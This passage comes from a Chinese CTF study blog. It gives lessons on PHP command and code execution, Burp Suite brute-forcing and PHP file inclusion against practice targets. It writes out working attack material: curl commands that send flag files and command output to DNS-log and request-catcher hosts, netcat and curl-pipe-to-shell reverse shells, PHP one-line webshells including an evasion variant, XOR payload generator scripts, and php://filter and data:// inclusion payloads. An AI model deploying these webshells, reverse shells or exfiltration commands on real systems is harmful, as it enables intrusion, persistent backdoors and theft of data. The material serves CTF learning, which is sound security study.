<p>例如<code>GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D</code></p>
<p><code>cmd=tac$&#123;GPG_KEYS:40:1&#125;*</code></p>
<h4 id="不回显"><a href="#不回显" class="headerlink" title="不回显"></a>不回显</h4><p>没办法直接看到回显，可以使用写文件的方式，将结果写到浏览器可以读取的位置，然后访问url+1.txt</p>
<h5 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h5><p>可以用 <code>&gt;</code> 写入</p>
<h5 id="dns通道"><a href="#dns通道" class="headerlink" title="dns通道"></a>dns通道</h5><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
<p>当文件过长无法全部回带时，可以部分回带，使用sed -n命令</p>
<p>可以使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=`sed -n &quot;3,4p&quot; fla?.php|base64`;curl $&#123;a:0:10&#125;.dnslog.cn #a中，从0开始截取10个，然后从10再截取，依此类推</span><br></pre></td></tr></table></figure>

<p>当dnslog被过滤时，可以使用</p>
<p><a href="https://requestrepo.com/#/">https://requestrepo.com/#/</a></p>
<p><a href="https://pipedream.com/">https://pipedream.com/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X POST --data a=`cat ./flag.php` http:/xxxx.com #POST</span><br><span class="line">curl http://xxx.com/?a=`whoami` #GET</span><br></pre></td></tr></table></figure>

<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>以及ctfshow专用反弹shell<a href="https://your-shell.com/">https://your-shell.com/</a></p>
<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>盲注猜flag</p>
<h2 id="第三节-php的代码执行"><a href="#第三节-php的代码执行" class="headerlink" title="第三节 php的代码执行"></a>第三节 php的代码执行</h2><h3 id="0x1-什么是php的代码执行"><a href="#0x1-什么是php的代码执行" class="headerlink" title="0x1 什么是php的代码执行"></a>0x1 什么是php的代码执行</h3><p><code>eval(&quot;要执行的代码&quot;);</code> 可以执行参数给的php代码</p>
<p>可以用?&gt;结束php代码。</p>
<h3 id="0x2-代码执行和命令执行的区别"><a href="#0x2-代码执行和命令执行的区别" class="headerlink" title="0x2 代码执行和命令执行的区别"></a>0x2 代码执行和命令执行的区别</h3><ul>
<li><input checked="" disabled="" type="checkbox"> system 命令执行</li>
<li><input checked="" disabled="" type="checkbox"> shell_exec 命令执行</li>
<li><input checked="" disabled="" type="checkbox"> eval 代码执行</li>
</ul>
<h3 id="0x3-php的代码执行是什么格式"><a href="#0x3-php的代码执行是什么格式" class="headerlink" title="0x3 php的代码执行是什么格式"></a>0x3 php的代码执行是什么格式</h3><p>在php语言中，代码分为三种</p>
<p>1.函数调用</p>
<p>函数名 (函数参数1，函数参数2 …);</p>
<p>2.类方法调用</p>
<p>类实例 箭头 类方法 ()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$_GET</span>[<span class="number">1</span>])(<span class="variable">$_GET</span>[<span class="number">2</span>]); <span class="comment">//免杀一句话木马</span></span><br></pre></td></tr></table></figure>

<p>3.语言结构调用</p>
<h3 id="0x4-php的代码执行后门"><a href="#0x4-php的代码执行后门" class="headerlink" title="0x4 php的代码执行后门"></a>0x4 php的代码执行后门</h3><p>一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">//蚁剑连接</span></span><br></pre></td></tr></table></figure>

<p>get转post转接头</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">?<span class="number">1</span>=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="0x5-代码执行的类型"><a href="#0x5-代码执行的类型" class="headerlink" title="0x5 代码执行的类型"></a>0x5 代码执行的类型</h3><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png" alt="image-20220905205127371"></p>
<p><code>(&quot;sys&quot;.&quot;tem&quot;)=system</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_POST[<span class="number">1</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>php5.6版本以前的可用</p>
<p>最短木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>`<span class="variable">$_GET</span>[<span class="number">2</span>]`;&amp;<span class="number">2</span>=</span><br></pre></td></tr></table></figure>

<p>反弹 shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc ip port -e /bin/sh #传统姿势</span><br><span class="line">curl https://your-shell.com/ip:port |sh #ctfshow新姿势</span><br></pre></td></tr></table></figure>

<h2 id="烧姿势"><a href="#烧姿势" class="headerlink" title="烧姿势"></a>烧姿势</h2><h4 id="1-无字母数字命令执行"><a href="#1-无字母数字命令执行" class="headerlink" title="1.无字母数字命令执行"></a>1.无字母数字命令执行</h4><p>采用文件上传的方式，匹配到temp目录下的文件，在该文件中写入命令执行代码</p>
<p>这里搬用一下ctfshow师傅写的upload代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://靶场地址/?cmd=. /???/????????[@-[]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>匹配临时文件，写入命令，实现命令执行</p>
<p>这里开一个靶场写一下详细过程</p>
<p>这里我们把upload.html挂到PHP study</p>
<p>然后随便传一个.txt</p>
<p>打开bp，开抓</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071106066.png" alt="image-20220907110602945"></p>
<p>我们发到repeater</p>
<p>然后把我们1.txt文件中的内容改成要执行的命令，发包!</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071111453.png" alt="image-20220907111148387"></p>
<p>成功，如果不成功可以多发几次，因为我们匹配的文件名是未知的，能否正确匹配也是概率事件，多发几次就会成功。</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071114216.png" alt="image-20220907111400146"></p>
<h4 id="2-无字母数字代码执行"><a href="#2-无字母数字代码执行" class="headerlink" title="2.无字母数字代码执行"></a>2.无字母数字代码执行</h4><p>这里我们有两个脚本</p>
<p>作者都来自羽师傅</p>
<p>首先是一个php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                                        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们把他挂在PHP study，会在本地生成一个<code>xor_rce.txt</code></p>
<p>然后是一个python脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们跑一下，在<code>function：</code>和<code>command：</code>下分别填入我们想要执行的命令</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071133034.png" alt="image-20220907113334808"></p>
<p>然后就会生成一串异或出来的命令，复制执行即可</p>
<p>这里的<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;);</code></p>
<p>虽然看上去存在一些数字字母，但是都是url编码后的，我们可以解码看一下</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071137175.png" alt="image-20220907113751127" style="zoom:50%;" />

<p>是一些不可见字符昂</p>
<h4 id="3-巧用蚁剑插件当脚本小子"><a href="#3-巧用蚁剑插件当脚本小子" class="headerlink" title="3.巧用蚁剑插件当脚本小子"></a>3.巧用蚁剑插件当脚本小子</h4><p>在这开始我们要准备一个比较新的中国蚁剑，不要像我一样，打开2016版的蚁剑</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071659033.png" alt="image-20220907165937928"></p>
<p>打开2019版的蚁剑，至少插件商城能用</p>
<p>装几个插件，这是比较有用的几个，当然根据自己需求在商城里随便装</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071701964.png" alt="image-20220907170134913"></p>
<p>这里我们不再赘述一句话木马的上传，这时候我们一句话已经连上了，但是无论是读取flag，还是命令执行都没用</p>
<p>然后，来到上传后的提权/绕过操作</p>
<p>加载disable_functions,选择第一个LD_PRELOAD，开始</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071717134.png" alt="image-20220907171716075"></p>
<p>能看到当前目录下生成了一个<code>.antproxy.php</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722782.png" alt="image-20220907172202728"></p>
<p>我们直接连这个文件</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071722408.png" alt="image-20220907172258368"></p>
<p>这时候我们回到终端<code>whoami</code></p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071726093.png" alt="image-20220907172642064" style="zoom: 80%;" />

<p>注意这里不要打成<code>who m ai 👴！</code></p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071727973.png" alt="image-20220907172723929" style="zoom:67%;" />

<p>然后我们cat试试</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071728837.png" alt="image-20220907172800805"></p>
<p>没有权限，看来www-data权限还不够，会不会有其他命令，不用root权限，却能代替cat</p>
<p>这里来一些Linux知识</p>
<blockquote>
<p>在linux下我们经常用到的四个应用程序的目录是/bin、/sbin、/usr/bin、/usr/sbin 。而四者存放的文件一般如下：</p>
<p><strong>bin目录:</strong> </p>
<p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</p>
<p><strong>/usr/bin目录:</strong></p>
<p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb</em>、wget等。</p>
<p><strong>/sbin目录:</strong> </p>
<p>主要放置一些系统管理的必备程序例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。</p>
<p><strong>/usr/sbin目录:</strong> </p>
<p>放置一些网路管理的必备程序例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等</p>
<p><strong>综述：</strong></p>
<p>如果这是用户和管理员必备的二进制文件，就会放在/bin。如果这是系统管理员必备，但是一般用户根本不会用到的二进制文件，就会放在 /sbin。</p>
<p>相对而言。如果不是用户必备的二进制文件，多半会放在/usr/bin；如果不是系统管理员必备的工具，多半会放在/usr/sbin</p>
</blockquote>
<blockquote>
<p>单纯使用ls命令，显示的内容有限。在实际使用的时候，经常需要搭配一些选项来显示更加丰富的内容，ls常用的附加选项如下表所示：</p>
<p>-a    显示指定路径中的所有文件，包括隐藏文件<br>-l    显示文件的详细信息，包括文件类型，权限，所属用户，所属用户组，文件大小，上一次修改时间等<br>-h    文件大小以KBytes为单位显示<br>-S    按照文件大小顺序显示，默认从大到小；若要从小到大，可使用-Sr</p>
</blockquote>
<p>我们 <code>ls -al /usr/bin</code>发现（这里是fuzz的，其他题也行需要<code>ls -al</code> 其他文件夹，甚至可以<code>ls -al /*/*</code>）</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071734337.png" alt="image-20220907173454307"></p>
<p>这里的<code>-rwsr-sr-x</code></p>
<blockquote>
<p>第一个s代表的是suid：<br>他表示当其他的用户执行此命令时，可以取得和此文件的所有者一样的权限来取得系统资源<br>第而个s代表的是sgid：<br>他表示当其他的用户执行此命令时，可以取得和此文件的属组一样的权限来取得系统资源</p>
</blockquote>
<p>总之，<code>tac</code> 可用</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209071741558.png" alt="image-20220907174119532"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_1_简单信息搜集+burp基本使用</title>
    <url>/2022/09/02/web_1/</url>
    <content><![CDATA[<h2 id="第一节-初始化学习"><a href="#第一节-初始化学习" class="headerlink" title="第一节  初始化学习"></a>第一节  初始化学习</h2><h3 id="0x1给自己起一个响亮的花名"><a href="#0x1给自己起一个响亮的花名" class="headerlink" title="0x1给自己起一个响亮的花名"></a>0x1给自己起一个响亮的花名</h3><h3 id="0x2分队"><a href="#0x2分队" class="headerlink" title="0x2分队"></a>0x2分队</h3><p>两队互相激励</p>
<h3 id="0x3记笔记-blog"><a href="#0x3记笔记-blog" class="headerlink" title="0x3记笔记/blog"></a>0x3记笔记/blog</h3><p>wanan师傅教搭建blog了，应该已经搭好了</p>
<h3 id="0x4环境-amp-amp-约定"><a href="#0x4环境-amp-amp-约定" class="headerlink" title="0x4环境&amp;&amp;约定"></a>0x4环境&amp;&amp;约定</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>有一台电脑</p>
<h4 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h4><p>flag 题目答案</p>
<p>poc 漏洞演示，不具有工具性</p>
<p>exp 直接进行漏洞利用</p>
<p>脚本 自动化代码</p>
<h2 id="第二节-认识漏洞"><a href="#第二节-认识漏洞" class="headerlink" title="第二节 认识漏洞"></a>第二节 认识漏洞</h2><h3 id="0x1-什么是漏洞"><a href="#0x1-什么是漏洞" class="headerlink" title="0x1 什么是漏洞"></a>0x1 什么是漏洞</h3><p>WEB漏洞通常是指网站程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，常见的WEB漏洞有Sql注入、Xss漏洞、上传漏洞等。</p>
<p><code>摘自百度百科</code></p>
<h3 id="0x2-漏洞产生的原因"><a href="#0x2-漏洞产生的原因" class="headerlink" title="0x2 漏洞产生的原因"></a>0x2 漏洞产生的原因</h3><h3 id="0x3-漏洞的利用"><a href="#0x3-漏洞的利用" class="headerlink" title="0x3 漏洞的利用"></a>0x3 漏洞的利用</h3><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209011935565.png" alt="image-20220901193532517"></p>
<h3 id="0x4-做题思路"><a href="#0x4-做题思路" class="headerlink" title="0x4 做题思路"></a>0x4 做题思路</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>先文件读取，再文件写入，再命令执行</p>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>判断漏洞类型</p>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>找flag</p>
<h2 id="第三节-信息泄露"><a href="#第三节-信息泄露" class="headerlink" title="第三节 信息泄露"></a>第三节 信息泄露</h2><h3 id="0x1-类型"><a href="#0x1-类型" class="headerlink" title="0x1 类型"></a>0x1 类型</h3><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209011941653.png" alt="image-20220901194121614"></p>
<h3 id="0x2-漏洞利用"><a href="#0x2-漏洞利用" class="headerlink" title="0x2 漏洞利用"></a>0x2 漏洞利用</h3><h4 id="1-http头部信息"><a href="#1-http头部信息" class="headerlink" title="1 http头部信息"></a>1 http头部信息</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209011944729.png" alt="image-20220901194455667"></p>
<p><code>baidu.com/1.jsp</code></p>
<p>F12 可以看到前端可能是阿帕奇</p>
<p><code>baiducom/index.php</code></p>
<p>server 成为了 BWS/1.1</p>
<h4 id="2-报错信息"><a href="#2-报错信息" class="headerlink" title="2 报错信息"></a>2 报错信息</h4><h4 id="3-页面信息"><a href="#3-页面信息" class="headerlink" title="3 页面信息"></a>3 页面信息</h4><h4 id="4-robots-txt"><a href="#4-robots-txt" class="headerlink" title="4 robots.txt"></a>4 robots.txt</h4><p>防君子不防小人</p>
<p>此地无银三百两</p>
<h4 id="5-git"><a href="#5-git" class="headerlink" title="5 .git"></a>5 .git</h4><p>githack</p>
<p>使用方法</p>
<p><code>python githack.py http://charmersix.icu/.git/</code></p>
<p>跑完之后会在本地生成一个文件夹，里边有重要信息</p>
<p>/.git/ 403表示此目录存在</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209012043688.png" alt="image-20220901204332656"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209012049019.png" alt="image-20220901204920987"></p>
<p><a href="https://buuoj.cn/challenges">buu题目Nu1l</a></p>
<h2 id="第四节-burp-suite"><a href="#第四节-burp-suite" class="headerlink" title="第四节 burp suite"></a>第四节 burp suite</h2><p>抓包，爆破</p>
<p>bp的安装，Java环境，proxy插件</p>
<p>设置好代理，开启拦截，刷新一下你的浏览器就可以看见抓到的包</p>
<p>这里我们以bugku的一个题目为例子，演示一下使用bp进行爆破</p>
<p><a href="https://ctf.bugku.com/challenges/detail/id/314.html">题目链接</a></p>
<p>现在我们打开题目，开启拦截</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209021153449.png" alt="image-20220902115302313"></p>
<p>然后我们往里填一个自己猜的密码，比如我这里是123456</p>
<p>点提交，就能看见自己抓的包</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209021155540.png" alt="image-20220902115559500"></p>
<p>这里可以看见我们已经抓到了，我们点鼠标右键，发送到intruder</p>
<p>来到位置这里，我们可以把admin位置删掉，因为一开始admin给出了，不需要我们爆破</p>
<p>只需要删除admin两边的§符号即可</p>
<p>我们继续看下一栏</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209021200275.png" alt="image-20220902120007229"></p>
<p>这里选择简单列表即可，然后导入我们从网上下载的top1000密码，开始爆破</p>
<p>失败</p>
<p>通过观察相应包，我们发现，无论是否爆破成功，这里都会通过js告诉你爆破失败</p>
<p>那我么只需要过滤掉<code>&#123;code: &#39;bugku10000&#39;&#125;</code>就能知道，到底哪个是真正被爆破成功的</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209021218953.png" alt="image-20220902121838909"></p>
<p>然后爆破，就能出密码</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>burpsuite</tag>
        <tag>F12</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_3_PHP文件包含</title>
    <url>/2022/09/10/web_3/</url>
    <content><![CDATA[<h2 id="第一节-php文件包含"><a href="#第一节-php文件包含" class="headerlink" title="第一节 php文件包含"></a>第一节 php文件包含</h2><h3 id="0x1文件包含的本质"><a href="#0x1文件包含的本质" class="headerlink" title="0x1文件包含的本质"></a>0x1文件包含的本质</h3><p>指定一个文件，用函数作为接口调用。</p>
<h3 id="0x2文件包含常见函数"><a href="#0x2文件包含常见函数" class="headerlink" title="0x2文件包含常见函数"></a>0x2文件包含常见函数</h3><p>include、require、include_once、require_once</p>
<ul>
<li>include 仅仅是包含，包含不到不影响后续执行</li>
<li>require 必须包含成功、包含不到就报错不再执行</li>
<li>include_once 包含一次，再次包含同样文件不再重复包含</li>
<li>require_once 同上包含一次</li>
</ul>
<h3 id="0x3伪协议"><a href="#0x3伪协议" class="headerlink" title="0x3伪协议"></a>0x3伪协议</h3><h4 id="计算机中的协议"><a href="#计算机中的协议" class="headerlink" title="计算机中的协议"></a>计算机中的协议</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209072048708.png" alt="image-20220907204814672"></p>
<h4 id="php中的伪协议"><a href="#php中的伪协议" class="headerlink" title="php中的伪协议"></a>php中的伪协议</h4><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><p>Linux php中可以自己计算目录，可以存在虚拟目录，可以../很多</p>
<h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><h4 id="ftp协议"><a href="#ftp协议" class="headerlink" title="ftp协议"></a>ftp协议</h4><h4 id="php协议"><a href="#php协议" class="headerlink" title="php协议"></a>php协议</h4><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>直接post发包即可</p>
<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p>是一种原封装器</p>
<p>参数</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>resource=&lt;要过滤的数据流&gt;</em></td>
<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td><em>read=&lt;读链的筛选列表&gt;</em></td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td><em>write=&lt;写链的筛选列表&gt;</em></td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td><em>&lt;；两个链的筛选列表&gt;</em></td>
<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀         的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<p>简言之，resource是数据来源，write写入，read读取</p>
<p>base64绕过</p>
<p><code>?file=php://filter/write=convert.base64-decode/resource=1.php</code></p>
<p>这里我们还需要post发包写入的内容，而且要base64编码后</p>
<p>rot13绕过</p>
<p><code>?file=php://filter/write=string.rot13/resource=1.php</code></p>
<p>这里同样需要post发包写入的内容，而且要rot13编码后，这里还是推荐<a href="https://ctf.mzy0.com/CyberChef3/#recipe=ROT13(true,true,false,13)">CyberChef</a></p>
<h4 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h4><p>可以直接执行里边代码内容</p>
<h5 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h5><p>我们可以在官方文档中看到它的语法</p>
<p><a href="http://www.faqs.org/rfcs/rfc2397.html">http://www.faqs.org/rfcs/rfc2397.html</a></p>
<p><code>?file=data:,&lt;?php phpinfo(); ?&gt;</code></p>
<h2 id="第二节-文件包含高级利用"><a href="#第二节-文件包含高级利用" class="headerlink" title="第二节 文件包含高级利用"></a>第二节 文件包含高级利用</h2><h3 id="文件包含可控点"><a href="#文件包含可控点" class="headerlink" title="文件包含可控点"></a>文件包含可控点</h3><ul>
<li>文件名可控</li>
<li>后缀可控</li>
</ul>
<h4 id="文件名可控"><a href="#文件名可控" class="headerlink" title="文件名可控"></a>文件名可控</h4><p>意味着可以控制协议头</p>
<p>这时候优先使用data协议</p>
